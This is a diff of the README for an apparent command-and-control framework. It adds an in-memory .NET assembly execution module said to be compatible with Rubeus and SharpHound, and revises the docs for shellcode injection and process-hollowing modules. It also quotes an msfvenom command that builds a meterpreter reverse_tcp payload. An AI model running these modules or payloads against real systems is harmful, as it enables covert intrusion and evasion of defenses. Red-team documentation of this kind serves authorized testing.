@@ -18,7 +18,7 @@ pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
 
 ## Inline-Execute
 
-This module interfaces with an agent and enables pure in-memory execution of Beacon Object Files (BOFs) without any disk writes or PowerShell usage. The solution leverages the goffloader library to execute BOFs directly in the agent's memory space.
+This module interfaces with an agent and enables pure in-memory execution of Beacon Object Files (BOFs) without any disk writes. The solution leverages the goffloader library to execute BOFs directly in the agent's memory space.
 
 #### Compatibility
 - Go_agent
@@ -40,9 +40,40 @@ modules info inline-execute
 inline-execute <path_to_bof_file> [arguments]
 ```
 
+## Inline-Assembly
+
+This module interfaces with an agent and enables in-memory execution of .NET assemblies without any disk writes. The solution leverages the go-clr library to execute .NET assemblies directly in the agent's memory space, supporting both .NET executables (.exe) and libraries (.dll).
+
+#### Compatibility
+- Go_agent
+- Windows x64
+
+#### Usage
+1. Place .NET assemblies in accessible locations on the C2 Server
+2. Use the module with an assembly file path
+3. The agent will load the CLR runtime and execute the assembly in-memory
+4. Assembly output is captured and sent back through the C2 channel to the operator
+5. No files written to disk at any stage; complete execution in agent's memory space
+
+### Command syntax
+Execute .NET assemblies using the inline-assembly command:
+
+```
+modules info inline-assembly
+# In interactive mode, the agent ID is automatically inferred:
+inline-assembly <path_to_assembly_file> [agent_id=<agent_id>]
+```
+
+### Key Features:
+- Supports .NET Framework v4 and above
+- Captures stdout/stderr output from executed assemblies
+- Handles both .NET executables and libraries
+- Direct in-memory execution without file system access
+- Compatible with tools like Rubeus, SharpHound, and other .NET utilities
+
 ## PInject
 
-This module interfaces with an active agent for In-memory shellcode injection into a remote process
+This module interfaces with an active agent for In-memory shellcode injection into a sacrificial process
 
 #### Compatibility
 - Go_agent
@@ -59,6 +90,7 @@ Generate shellcode with proper null byte avoidance and correct format:
 ```
 # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
 # Then base64 encode it before sending to the module
+
 base64 -w 0 shellcode.bin
 
 pinject <shellcode> # METHOD - 1 (Interactive mode)
@@ -87,7 +119,7 @@ run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode
 
 ## PEInject
 
-This module interfaces with an agent and enables In-memory Injection of an unmanaged PE(Portable Executable) using Process Hollowing into a remote process
+This module interfaces with an agent and enables In-memory Injection of an unmanaged PE(Portable Executable) using Process Hollowing into a sacrificial process
 
 #### Compatibility
 - Go_agent
